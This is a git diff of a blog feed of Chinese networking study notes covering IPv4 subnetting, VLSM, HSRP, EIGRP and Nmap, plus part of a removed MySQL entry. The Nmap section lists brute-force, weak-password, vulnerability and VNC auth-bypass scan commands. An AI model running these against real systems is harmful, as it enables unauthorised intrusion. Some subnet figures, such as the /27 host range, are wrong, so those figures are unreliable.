+    <content type="html"><![CDATA[<h1 id="IPV4编址方案："><a href="#IPV4编址方案：" class="headerlink" title="IPV4编址方案："></a>IPV4编址方案：</h1><p>IP地址由32位二进制数组成，这些位被划分为4组，中间用“.”号隔开，每组8位，以十进制数形式表示。分为网络地址和主机地址两个部分。</p><h3 id="IP地址分类："><a href="#IP地址分类：" class="headerlink" title="IP地址分类："></a>IP地址分类：</h3><p><strong>⚫A类网络地址：</strong></p><p>第一个字节的第一位必须为0，第一个字节的取值为0-127</p><p>即：<code>0</code>xxxxxxx    取值范围是：<code>0</code>0000000－<code>0</code>1111111  （0-127）</p><p>例如：1.1.1.1/8       网络号：8位    255.0.0.0</p><p>网络地址：1.0.0.0</p><p>广播地址：1.255.255.255</p><p>网络地址数：2^24</p><p>有效地址：2^24-2</p><p>实际可用的A类网络地址数为：2^7=128</p><p>合法的主机数为：2 ^24-2＝16777214</p><p>私有地址范围：10.0.0.0~10.255.255.255</p><p><code>私有IP地址是一段保留的IP地址。只使用在局域网中，无法在Internet上使用</code></p><p><strong>⚫B类网络地址范围：</strong></p><p>第一个字节的第一位必须是1，且第二位必须是0，第一个字节的取值为128-191</p><p>即：<code>1</code>0000000   取值范围是：<code>1</code>0000000-10111111   （128-191）</p><p>例如：172.16.0.0/16    网络号：16位    255.255.0.0</p><p>网络地址：172.16.0.0</p><p>广播地址：172.16.255.255</p><p>网络地址数：2^16</p><p>有效地址：2^16-2</p><p>实际可用的B类网络地址数为：2^14=16384</p><p>合法的主机数为：2^16-2=65534</p><p>私有地址范围：172.16.0.0~172.31.255.255</p><p><strong>⚫C类网络的地址范围:</strong></p><p>第一个字节的前两位必须是1，且第三位必须是0，第一个字节的取值为192-223</p><p>即：<code>110</code>00000   取值范围是：<code>110</code>00000－11011111  （192-223）</p><p>例如：192.168.1.1/24    网络号：24位    255.255.255.0</p><p>网络地址：192.168.1.0</p><p>广播地址：192.168.1.255</p><p>网络地址数：2^8</p><p>有效地址：2^8-2</p><p>实际可用的C类网络地址数为：2^21=2097152</p><p>合法的主机数为：2^8-2=254</p><p>私有地址范围：192.168.0.0~192.168.255.255</p><p><strong>⚫D类网络的地址范围:</strong></p><p>第一个字节为224-239，用作组播地址。</p><p><strong>⚫E类网络的地址范围：</strong></p><p>第一个字节为240-255，用于科学用途。</p><hr><h3 id="保留的IP地址："><a href="#保留的IP地址：" class="headerlink" title="保留的IP地址："></a>保留的IP地址：</h3><p>1、网络地址全为0：表示当前网络或网段</p><p>2、网络地址全为1：表示所有网络</p><p>3、地址127.0.0.1：保留用于环回测试</p><p>4、节点地址全为0：表示网络地址或指定网络中的任何主机</p><p>5、节点地址全为1：表示指定网络中的所有节点</p><p>6、整个IP地址全为0：思科路由器用它来指定默认路由，也可能表示任何网络</p><p>7、整个IP地址全为1：到当前网络中所有节点的广播，有时称为“全1广播”或限定广播，即：255.255.255.255</p><hr><h3 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h3><p>将大的网络划分成若干个小网络，尽量减少广播风暴，提高网络效率。</p><p><strong>例：</strong>192.168.1.16/27</p><p>​    此网络后缀为/27，借位数为27-24=3，子网数为2^3=8</p><p>​    二进制表示：11111111.11111111.11111111.11100000</p><p>​    子网块大小：256/8=32</p><p>​    子网掩码：255.255.255.(256-32)=255.255.255.224</p><p>​    网络号：192.168.1.0</p><p>​    广播号：192.168.1.31</p><p>​    有效地址范围：192.168.1.1~192.16.1.62</p><p><strong>子网创建步骤：</strong></p><p>​    （1）确定需要的网络ID数</p><p>​               ■ 每个LAN子网一个</p><p>​               ■ 每条广域网连接一个        </p><p>​    （2）确定每个子网所需的主机ID数</p><p>​               ■每个TCP/IP主机一个</p><p>​               ■每个路由器接口一个</p><p>​    （3）根据上述需要，确定如下内容：</p><p>​               ■一个用于整个网络的子网掩码</p><p>​               ■每个物理网段的唯一子网ID</p><p>​               ■每个子网的主机ID范围</p><p><strong>CIDR：</strong></p><p>CIDR（classless inter-domain routing）,无类域间选择，它是ISP用来将大量地址分配给客户的一种方法。</p><p>CIDR值表：    </p><table><thead><tr><th align="left">子网掩码</th><th align="left">后缀</th><th align="left">子网掩码</th><th align="left">后缀</th></tr></thead><tbody><tr><td align="left">255.0.0.0</td><td align="left">/8</td><td align="left">255.255.240.0</td><td align="left">/20</td></tr><tr><td align="left">255.128.0.0</td><td align="left">/9</td><td align="left">255.255.248.0</td><td align="left">/21</td></tr><tr><td align="left">255.192.0.0</td><td align="left">/10</td><td align="left">255.255.252.0</td><td align="left">/22</td></tr><tr><td align="left">255.224.0.0</td><td align="left">/11</td><td align="left">255.255.254.0</td><td align="left">/23</td></tr><tr><td align="left">255.240.0.0</td><td align="left">/12</td><td align="left">255.255.255.0</td><td align="left">/24</td></tr><tr><td align="left">255.248.0.0</td><td align="left">/13</td><td align="left">255.255.255.128</td><td align="left">/25</td></tr><tr><td align="left">255.252.0.0</td><td align="left">/14</td><td align="left">255.255.255.192</td><td align="left">/26</td></tr><tr><td align="left">255.254.0.0</td><td align="left">/15</td><td align="left">255.255.255.224</td><td align="left">/27</td></tr><tr><td align="left">255.255.0.0</td><td align="left">/16</td><td align="left">255.255.255.240</td><td align="left">/28</td></tr><tr><td align="left">255.255.128.0</td><td align="left">/17</td><td align="left">255.255.255.248</td><td align="left">/29</td></tr><tr><td align="left">255.255.192.0</td><td align="left">/18</td><td align="left">255.255.255.252</td><td align="left">/30</td></tr><tr><td align="left">255.255.224.0</td><td align="left">/19</td><td align="left"></td><td align="left"></td></tr></tbody></table><hr><h1 id="VLSM-变长子网掩码-："><a href="#VLSM-变长子网掩码-：" class="headerlink" title="VLSM(变长子网掩码)："></a>VLSM(变长子网掩码)：</h1><h3 id="VLSM网络划分："><a href="#VLSM网络划分：" class="headerlink" title="VLSM网络划分："></a>VLSM网络划分：</h3><p>使用长度不同的子网掩码将网络划分成多个子网，适用于不同类型的网络设计，称为VLSM组网。</p><p> 分类路由选择：RIPv1，IGRP协议</p><p> 无类路由选择：RIPv2，EIGRP，OSPF等协议</p><p><strong>有类路由</strong>：汇总以后地址是标准的A B C类地址掩码 即 255.0.0.0 255.255.0.0 255.255.255.0 （有类路由里 大类网络中 子网码必须一致 这样叫做有类路由 因为有类路由协议不传递子网码信息）　</p><p><strong>无类路由</strong>：汇总以后地址是无类的比如 172.16.12.0/16 -<br>172.16.15.0/16 汇总以后的地址是 172.16.12.0/20 子码 不属于 A B C 3个类别（无类路由是相反的 他传递子网信息所有大类网络中可以使用不同的子网码）</p><p><strong>例：</strong>将192.168.10.0/24网段划分成5个子网，每个子网主机数如下：</p><p>​    网络一：25台    网络二：12台    网络三：10台    </p><p>​    网络四：6台      网络五：2台</p><p>​    步骤：</p><p>​        <code>1、将主机数从大到小排列</code></p><p>​        <code>2、分配子网块大小</code></p><p>​        <code>3、计算子网范围、掩码等</code></p><p>​    网络一的块大小为32能满足条件</p><p>​    网络二的块大小为16能满足条件</p><p>​    网络三的块大小为16能满足条件</p><p>​    网络二的块大小为8能满足条件</p><p>​    网络二的块大小为4能满足条件</p><p>​    然后从192.168.10.0开始分配，块大小越大的越先分配，这样不会造成地址浪费。若从小到大分配，会导致不能连续分配地址，子网与子网之间必须要间隔一段，这一段将不能使用。所以分配地址的时候最好按照子网大小，<code>从大到小</code>分配。</p><h3 id="地址汇总："><a href="#地址汇总：" class="headerlink" title="地址汇总："></a>地址汇总：</h3><p>地址汇总也叫路由聚合，让路由选择协议能够用一个地址通告众多网络。旨在缩小路由器中路由选择表的规模，以节省内存，并缩短IP对路由选择表进行分析以找出前往远程网络的所需时间。</p><p>地址汇总步骤：</p><p>​    1、确定变化位置</p><p>​    2、计算块大小</p><p><strong>例：</strong>192.168.<code>16</code>.0-192.168.<code>31</code>.0</p><p>​    首先确定变化位置在第3字节，然后变化量为31-16=15，则块大小为16能满足。</p><p>​    子网掩码：255.255.(256-16).0=255.255.240.0</p><p>​    后缀：16+4=/20</p><p>​    网络范围：192.168.16.0~192.168.31.0</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;IPV4编址方案：&quot;&gt;&lt;a href=&quot;#IPV4编址方案：&quot; class=&quot;headerlink&quot; title=&quot;IPV4编址方案：&quot;&gt;&lt;/a&gt;IPV4编址方案：&lt;/h1&gt;&lt;p&gt;IP地址由32位二进制数组成，这些位被划分为4组，中间用“.”号隔开，每组8位，以十
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HSRP热备份路由协议</title>
+    <link href="http://yoursite.com/2019/09/23/HSRP/"/>
+    <id>http://yoursite.com/2019/09/23/HSRP/</id>
+    <published>2019-09-23T02:59:03.529Z</published>
+    <updated>2019-08-25T13:38:18.658Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="HSRP（热备份路由协议）："><a href="#HSRP（热备份路由协议）：" class="headerlink" title="HSRP（热备份路由协议）："></a>HSRP（热备份路由协议）：</h1><p><strong>热备份路由协议(HSRP)</strong></p><p>是思科推出的用于建立容错默认网关的专有冗余协议，由RFC 2281进行描述。</p><p><strong>虚拟路由冗余协议(VRRP)</strong></p><p>是基于标准的HSRP替代协议，由IETF标准RFC 3768进行描述。这两种技术在概念上相似，但互不兼容。</p><h3 id="HSRP工作原理："><a href="#HSRP工作原理：" class="headerlink" title="HSRP工作原理："></a>HSRP工作原理：</h3><p>HSRP在网络路由器之间建立默认网关的倒换框架，当主网关不可达时进行切换。此协议经常与快速会聚路由协议EIGRP或OSPF协同工作。HSRP使用多播地址224.0.0.2和UDP端口1985向其他启用HSRP协议的路由器发送HELLO报文，来交流路由器间的优先级。配置有最高优先级的主路由器将成为虚拟路由器，以预先配置好的网关IP和MAC地址0000.0c07.acXX（XX是组IP的十六进制值）回应局域网对网关的ARP的请求。如果主路由器宕机，次优先级路由器将接管网关IP并以同样的MAC地址回应ARP的请求，这样就实现了透明的默认网关自动倒换。</p><p>热备份路由协议确保在某一时间内只有一台路由器（称为主动路由器）以虚拟路由器的名义转发数据包。备份路由器被选择，并时刻准备成为主动路由器（在当前主动路由器失效的情况下）。热备份路由协议定义了一种通过IP地址来确定主动和备份路由器的机制。一旦这些确定了，一个主动路由器出故障就不会出现重大的连接中断现象。</p><p>在任何特定的网络中，可能有多个，也可能是重叠的，热备份群，每一个都有单一的媒体访问控制（MAC）地址和IP地址；IP地址应该属于初级子网，但它必须与实际或虚拟的地址（分配给网络中路由器或主机的地址）不同。</p><p>HSRP和VRRP都不是路由协议，因为它们不发布IP路由也不影响路由表。</p><h3 id="HSRP配置："><a href="#HSRP配置：" class="headerlink" title="HSRP配置："></a>HSRP配置：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#int vlan 10//进入vlan接口</span><br><span class="line">Router(config-if)#ip add 192.168.10.252 255.255.255.0//配置vlan地址</span><br><span class="line">Router(config-if)#standby 10 ip 192.168.10.254//配置虚拟网关</span><br><span class="line">Router(config-if)#standby 10 priority120//配置优先级（默认100）</span><br><span class="line">Router(config-if)#standby 10 preemp//配置抢占</span><br><span class="line">Router(config-if)#standby 10 timers 3 10//配置hello时间，每隔3秒发送一次，一次维持10秒</span><br><span class="line">Router(config-if)#standby 10 track f0/1//配置端口跟踪</span><br></pre></td></tr></table></figure><p><code>因为在一个网络中，vlan的地址不能相同，所以两个相同的vlan使用不同的vlan地址，但是两者都虚拟出同一个地址作为网关</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;HSRP（热备份路由协议）：&quot;&gt;&lt;a href=&quot;#HSRP（热备份路由协议）：&quot; class=&quot;headerlink&quot; title=&quot;HSRP（热备份路由协议）：&quot;&gt;&lt;/a&gt;HSRP（热备份路由协议）：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;热备份路由协议(HSRP)&lt;
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>EIGRP-增强内部网关路由协议</title>
+    <link href="http://yoursite.com/2019/09/23/EIGRP/"/>
+    <id>http://yoursite.com/2019/09/23/EIGRP/</id>
+    <published>2019-09-23T02:59:03.418Z</published>
+    <updated>2019-08-28T03:16:00.268Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="EIGRP："><a href="#EIGRP：" class="headerlink" title="EIGRP："></a>EIGRP：</h1><p>EIGRP:Enhanced Interior Gateway Routing Protocol 即 增强内部网关路由协议。也翻译为 加强型内部网关路由协议。 EIGRP是Cisco公司的私有协议（2013年已经公有化）。</p><p>EIGRP结合了链路状态和距离矢量型路由选择协议的Cisco专用协议，采用弥散修正算法（DUAL）来实现快速收敛，可以不发送定期的路由更新信息以减少带宽的占用，支持Appletalk、IP、Novell和NetWare等多种网络层协议。</p><h3 id="EIGRP的特点："><a href="#EIGRP的特点：" class="headerlink" title="EIGRP的特点："></a>EIGRP的特点：</h3><p>高级距离矢量                网络设计灵活</p><p>快速收敛                        用组播和单播地址来代替广播</p><p>无环路的无类路由         支持VLSM和不连续的子网</p><p>配置简单                         在Internet网络中任意点手动汇总</p><p>逐步更新                         支持多种网络层协议</p><p>在开销相等和不相等的路径上实现负载均衡</p><p><code>EIGRP的管理距离为90</code></p><hr><h3 id="EIGRP的关键技术："><a href="#EIGRP的关键技术：" class="headerlink" title="EIGRP的关键技术："></a>EIGRP的关键技术：</h3><p><strong>邻居发现/恢复机制：</strong>在邻居间使用hello报文，配置了EIGRP的路由器会主动建立与邻居的关系，建立邻接使用Hello报文发送每5或60秒。如果邻居错过了连续3个Hello报文的路由将被视为无效。默认值=15秒或180秒。</p><p><strong>可靠传输协议（RTP）：</strong>确保EIGRP报文可靠,有序地传送到所有邻居</p><p><strong>扩散更新算法（DUAL）：</strong>为去往每个目标选择最小开销,无环路的路径</p><p><strong>协议无关模块（PDMs）：</strong>EIGRP支持为IP,Apple Talk,IPX等协议计算路由</p><hr><h3 id="EIGRP内容："><a href="#EIGRP内容：" class="headerlink" title="EIGRP内容："></a>EIGRP内容：</h3><p><strong>EIGRP表：</strong>分别是邻居表、拓扑表、路由表</p><p><strong>AD和FD：</strong></p><p>​    通告距离（AD）：也称报告距离，下一跳路由器到目的地的度量值</p><p>​    可行距离（FD）：是本地路由器到达目的地的度量值</p><p><strong>后继者与可行后继：</strong></p><p>​    后继者（successor）：后继者是一个相邻路由器具有最低成本的路径到目的地（最低FD），是保证不会循环的一部分，后继路由用于转发数据包，如果他们具有相同的FD，可以存在多条相同路径。</p><p>​    可行后继（Feasible successor）：一个可行后继是离目的地很近的邻居，但不是最低开销的，一个可行后继确保一个无环拓扑，因为它的AD必须小于后继的FD。可行后继和后继在同一时间进行选择,但它只保存在拓扑表作为备份路径。拓扑表中可以保存多个可行后继为一个目的地。</p><p><strong>EIGRP Packets：</strong></p><p><img src="https://ftp.bmp.ovh/imgs/2019/08/88267c42f220f072.png" alt></p><p><strong>Initial Route Discovery：</strong></p><p><img src="https://ftp.bmp.ovh/imgs/2019/08/4f04e181dc83260e.png" alt></p><hr><h3 id="EIGRP度量值的计算（metric）："><a href="#EIGRP度量值的计算（metric）：" class="headerlink" title="EIGRP度量值的计算（metric）："></a>EIGRP度量值的计算（metric）：</h3><p>EIGRP使用一个复合度量，可根据以下指标：</p><p><strong>带宽</strong>          使用最小的带宽（BW），</p><p><strong>可靠性</strong>      是衡量一个链接将失败的可能性.</p><p><strong>延迟</strong>          延迟是衡量一个包需要穿越路由的时间.</p><p><strong>负载</strong>          反映了多少流量是使用链接</p><p><strong>MTU</strong>         最大传输单元</p><p><strong>默认情况下使用带宽和延迟！</strong></p><p><strong>metric值计算方法：</strong>metric值=256((10^7/bw)+(dly之和/10))</p><p>​    -bw:最小带宽</p><p>​    -dly:延迟之和，路由传递方向所有入接口的dly值的累加</p><hr><h3 id="EIGRP配置："><a href="#EIGRP配置：" class="headerlink" title="EIGRP配置："></a>EIGRP配置：</h3><p><strong>配置EIGRP：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#router eigrp 100//同一个自治系统的eigrp编号要相同</span><br><span class="line">Router(config-router)#network 192.168.1.0//通告直连网络</span><br><span class="line">Router(config-router)#network 192.168.1.0 0.0.0.255//也可加上反掩码</span><br><span class="line">Router(config-router)#no auto-summary//禁用自动总结</span><br><span class="line">Router(config-router)#passive-interface loopback0//配置被动接口</span><br><span class="line">Router(config)#int f0/0</span><br><span class="line">Router(config-if)#ip summary-address eigrp 100 192.168.1.0 255.255.255.0//EIGRP手动路由汇总</span><br></pre></td></tr></table></figure><p><strong>被动接口：</strong>被动接口（passive interface）一般应用于优化，比如在我们的拓扑中R2上有一个环回口lo0:2.2.2.2，向lo0口发送EIGRP报文是没必要的，当我们在EIGRP路由进程下启用lo0的被动接口后，R2将不再向lo0发送任何EIGRP报文，但是lo0的路由还是会被R2发送出去。</p><p><strong>检验EIGRP：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router#show ip route eigrp//查看路由表</span><br><span class="line">Router#show ip protocols</span><br><span class="line">Router#show ip eigrp interface</span><br><span class="line">Router#show ip eigrp neighbors//查看邻居表</span><br><span class="line">Router#show ip eigrp topology//查看拓扑表</span><br><span class="line">Router#show ip eigrp traffic</span><br></pre></td></tr></table></figure><hr><h3 id="EIGRP负载均衡："><a href="#EIGRP负载均衡：" class="headerlink" title="EIGRP负载均衡："></a>EIGRP负载均衡：</h3><p>等价负载均衡默认支持4条，不同IOS版本不同</p><p>v值计算方法：V&gt;FS/S,结果向上取整</p><p>配置方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#router eigrp 100//进入EIGRP100</span><br><span class="line">Router(config-router)#Variance 2//配置非等价负载均衡，V值为2</span><br></pre></td></tr></table></figure><hr><h3 id="EIGRP-MD5身份验证："><a href="#EIGRP-MD5身份验证：" class="headerlink" title="EIGRP MD5身份验证："></a>EIGRP MD5身份验证：</h3><p>EIGRP支持MD5身份验证，路由器对每个它发送的EIGRP数据包进行自我标识。路由器验证接收到的每个路由更新数据包的来源，每个参与的邻居都必须配置相同的密钥。</p><p><strong>配置步骤：</strong></p><p>1、创建密钥链，它是一组可能的密钥（密码）</p><p>2、对每个密钥分配密钥ID</p><p>3、标识密钥</p><p>4、指定密钥的有效期（可选）</p><p>5、在接口上启用MD5身份验证</p><p>6、指定接口使用的密钥链</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#key chain key1     //进入密钥链配置模式,密钥链名为key1</span><br><span class="line">Router(config-keychain)#key 1       //标识密钥并进入密钥ID的配置模式，密钥ID为1</span><br><span class="line">Router(config-keychain-key)#key-string 123  //标识密钥字符串（密码）</span><br><span class="line">Router(config)#int f0/1//进入接口</span><br><span class="line">Router(config-if)#ip authentication mode eigrp autonomous-system md5  //为EIGRP数据包指定MD5身份验证</span><br><span class="line">Router(config-if)#ip authentication key-chain eigrp autonomous-system key1//使用密钥链中的密钥来启用EIGRP数据包的身份验证</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;EIGRP：&quot;&gt;&lt;a href=&quot;#EIGRP：&quot; class=&quot;headerlink&quot; title=&quot;EIGRP：&quot;&gt;&lt;/a&gt;EIGRP：&lt;/h1&gt;&lt;p&gt;EIGRP:Enhanced Interior Gateway Routing Protocol 即 增强内
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
+    
+      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Nmap基本使用命令</title>
+    <link href="http://yoursite.com/2019/09/23/Nmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    <id>http://yoursite.com/2019/09/23/Nmap基本使用命令/</id>
+    <published>2019-09-23T02:58:39.994Z</published>
+    <updated>2019-08-16T11:43:40.255Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Nmap基础命令："><a href="#Nmap基础命令：" class="headerlink" title="Nmap基础命令："></a>Nmap基础命令：</h1><h5 id="扫描单个IP："><a href="#扫描单个IP：" class="headerlink" title="扫描单个IP："></a>扫描单个IP：</h5><p><code>nmap 172.16.13.12</code></p><h5 id="扫描多个IP："><a href="#扫描多个IP：" class="headerlink" title="扫描多个IP："></a>扫描多个IP：</h5><p><code>nmap 172.16.13.12 172.16.13.13</code></p><h5 id="扫描一个范围的目标地址："><a href="#扫描一个范围的目标地址：" class="headerlink" title="扫描一个范围的目标地址："></a>扫描一个范围的目标地址：</h5><p><code>nmap 172.16.13.12-15</code></p><h5 id="扫描一个网段的目标地址："><a href="#扫描一个网段的目标地址：" class="headerlink" title="扫描一个网段的目标地址："></a>扫描一个网段的目标地址：</h5><p><code>nmap 172.16.13.0/24</code></p><h5 id="扫描target-txt中主机列表中的地址："><a href="#扫描target-txt中主机列表中的地址：" class="headerlink" title="扫描target.txt中主机列表中的地址："></a>扫描target.txt中主机列表中的地址：</h5><p><code>nmap -iL target.txt</code></p><h5 id="扫描除了某一目标之外的其它地址："><a href="#扫描除了某一目标之外的其它地址：" class="headerlink" title="扫描除了某一目标之外的其它地址："></a>扫描除了某一目标之外的其它地址：</h5><p><code>nmap 172.16.13.0/24 -exclude 172.16.13.62</code></p><h5 id="扫描除了某一文件中的地之外的其它地址："><a href="#扫描除了某一文件中的地之外的其它地址：" class="headerlink" title="扫描除了某一文件中的地之外的其它地址："></a>扫描除了某一文件中的地之外的其它地址：</h5><p><code>nmap 172.16.13.0/24 -excludefile target.txt</code></p><h5 id="扫描目标地址的某些端口："><a href="#扫描目标地址的某些端口：" class="headerlink" title="扫描目标地址的某些端口："></a>扫描目标地址的某些端口：</h5><p><code>nmap 172.16.13.62 -p 21,22,23,24</code></p><h5 id="对目标地址进行路由跟踪："><a href="#对目标地址进行路由跟踪：" class="headerlink" title="对目标地址进行路由跟踪："></a>对目标地址进行路由跟踪：</h5><p><code>nmap -traceroute 172.16.13.12</code></p><h5 id="扫描在线主机："><a href="#扫描在线主机：" class="headerlink" title="扫描在线主机："></a>扫描在线主机：</h5><p><code>nmap -sP 172.16.13.0/24</code></p><h5 id="目标地址操作系统识别："><a href="#目标地址操作系统识别：" class="headerlink" title="目标地址操作系统识别："></a>目标地址操作系统识别：</h5><p><code>nmap -O 172.16.13.12</code></p><h5 id="目标地址提供的服务版本："><a href="#目标地址提供的服务版本：" class="headerlink" title="目标地址提供的服务版本："></a>目标地址提供的服务版本：</h5><p><code>nmap -sV 172.16.13.12</code></p><h5 id="探测目标防火墙状态："><a href="#探测目标防火墙状态：" class="headerlink" title="探测目标防火墙状态："></a>探测目标防火墙状态：</h5><p><code>nmap -sF -T4 172.16.13.12</code></p><h1 id="Nmap进阶命令："><a href="#Nmap进阶命令：" class="headerlink" title="Nmap进阶命令："></a>Nmap进阶命令：</h1><h5 id="扫描弱口令："><a href="#扫描弱口令：" class="headerlink" title="扫描弱口令："></a>扫描弱口令：</h5><p><code>nmap -script=auth 172.16.13.12</code></p><h5 id="暴力破解："><a href="#暴力破解：" class="headerlink" title="暴力破解："></a>暴力破解：</h5><p><code>nmap -script=brute 172.16.13.12</code></p><h5 id="扫描常见漏洞："><a href="#扫描常见漏洞：" class="headerlink" title="扫描常见漏洞："></a>扫描常见漏洞：</h5><p><code>nmap -script=vuln 172.16.13.12</code></p><h5 id="使用脚本进行应用服务扫描："><a href="#使用脚本进行应用服务扫描：" class="headerlink" title="使用脚本进行应用服务扫描："></a>使用脚本进行应用服务扫描：</h5><p><code>nmap -script=realvnc-auth-bypass 172.16.13.12</code></p><h5 id="探测局域网服务开放状态："><a href="#探测局域网服务开放状态：" class="headerlink" title="探测局域网服务开放状态："></a>探测局域网服务开放状态：</h5><p><code>nmap -script=broadcast 172.16.13.12</code></p><h5 id="Whois解析："><a href="#Whois解析：" class="headerlink" title="Whois解析："></a>Whois解析：</h5><p><code>nmap -script external baidu.com</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Nmap基础命令：&quot;&gt;&lt;a href=&quot;#Nmap基础命令：&quot; class=&quot;headerlink&quot; title=&quot;Nmap基础命令：&quot;&gt;&lt;/a&gt;Nmap基础命令：&lt;/h1&gt;&lt;h5 id=&quot;扫描单个IP：&quot;&gt;&lt;a href=&quot;#扫描单个IP：&quot; class=&quot;he
+      
+    
+    </summary>
+    
+      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="工具使用" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+    
+      <category term="漏洞扫描" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>文件上传漏洞攻击及防御</title>
@@ -88,440 +539,6 @@
     
     
       <category term="文件上传漏洞" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MySQL特殊数据库</title>
-    <link href="http://yoursite.com/2019/08/09/Mysql%E7%89%B9%E6%AE%8A%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
-    <id>http://yoursite.com/2019/08/09/Mysql特殊数据库/</id>
-    <published>2019-08-09T14:48:08.621Z</published>
-    <updated>2019-08-09T14:58:56.311Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="information-schema简介："><a href="#information-schema简介：" class="headerlink" title="information_schema简介："></a>information_schema简介：</h1><p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p><h1 id="information-schema数据库表说明"><a href="#information-schema数据库表说明" class="headerlink" title="information_schema数据库表说明:"></a>information_schema数据库表说明:</h1><h6 id="SCHEMATA表："><a href="#SCHEMATA表：" class="headerlink" title="SCHEMATA表："></a>SCHEMATA表：</h6><p>提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</p><h6 id="TABLES表："><a href="#TABLES表：" class="headerlink" title="TABLES表："></a>TABLES表：</h6><p>提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</p><h6 id="COLUMNS表："><a href="#COLUMNS表：" class="headerlink" title="COLUMNS表："></a>COLUMNS表：</h6><p>提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</p><h6 id="STATISTICS表："><a href="#STATISTICS表：" class="headerlink" title="STATISTICS表："></a>STATISTICS表：</h6><p>提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</p><h6 id="USER-PRIVILEGES表："><a href="#USER-PRIVILEGES表：" class="headerlink" title="USER_PRIVILEGES表："></a>USER_PRIVILEGES表：</h6><p>给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</p><h6 id="SCHEMA-PRIVILEGES表："><a href="#SCHEMA-PRIVILEGES表：" class="headerlink" title="SCHEMA_PRIVILEGES表："></a>SCHEMA_PRIVILEGES表：</h6><p>给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</p><h6 id="TABLE-PRIVILEGES表："><a href="#TABLE-PRIVILEGES表：" class="headerlink" title="TABLE_PRIVILEGES表："></a>TABLE_PRIVILEGES表：</h6><p>给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</p><h6 id="COLUMN-PRIVILEGES表："><a href="#COLUMN-PRIVILEGES表：" class="headerlink" title="COLUMN_PRIVILEGES表："></a>COLUMN_PRIVILEGES表：</h6><p>给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</p><h6 id="CHARACTER-SETS表："><a href="#CHARACTER-SETS表：" class="headerlink" title="CHARACTER_SETS表："></a>CHARACTER_SETS表：</h6><p>提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</p><h6 id="COLLATIONS表："><a href="#COLLATIONS表：" class="headerlink" title="COLLATIONS表："></a>COLLATIONS表：</h6><p>提供了关于各字符集的对照信息。</p><h6 id="COLLATION-CHARACTER-SET-APPLICABILITY表："><a href="#COLLATION-CHARACTER-SET-APPLICABILITY表：" class="headerlink" 